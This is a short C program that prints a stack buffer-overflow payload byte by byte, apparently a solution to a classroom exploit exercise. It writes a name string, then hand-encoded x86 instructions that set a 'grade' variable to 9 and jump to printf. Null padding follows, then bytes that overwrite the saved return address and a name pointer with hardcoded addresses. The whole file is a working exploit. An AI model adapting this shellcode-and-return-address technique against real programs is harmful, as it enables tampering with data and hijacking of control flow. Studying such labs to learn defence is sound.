#include<stdio.h>
/*
address of grade 0x80d46e8
address of Name  0x80d65e0
address where printf starts 0x8048b6f
*/

int main(){
int i;
putchar('L');
putchar('e');
putchar('f');
putchar('t');
putchar('e');
putchar('r');
putchar('i');
putchar('s');
putchar('\0');

/*code of movb */
putchar(0xc6);
putchar(0x5);
/*address of grade*/
putchar(0xe8);
putchar(0x46);
putchar(0x0d);
putchar(0x8);

/* 9 */
putchar(0x39); 
    putchar(0xb8);


/*address where printf starts 0x8048b6f*/
putchar(0x6f);
putchar(0x8b);
putchar(0x04);
putchar(0x8);

/*code of jmp */
putchar(0xff);
putchar(0xe0);

/*useless space of the array and c*/
for(i=0;i<25;i++)
        putchar('\0');


/*pass 8 bytes in order to reach ret add*/
 putchar('8');

/* retaddr which starts after the name with \0*/
putchar(0xe9);
putchar(0x65);
putchar(0x0d);
putchar(0x8);
/*override address of the name*/
putchar(0xe0);
putchar(0x65);
putchar(0x0d);
putchar(0x8);

return 0;
}
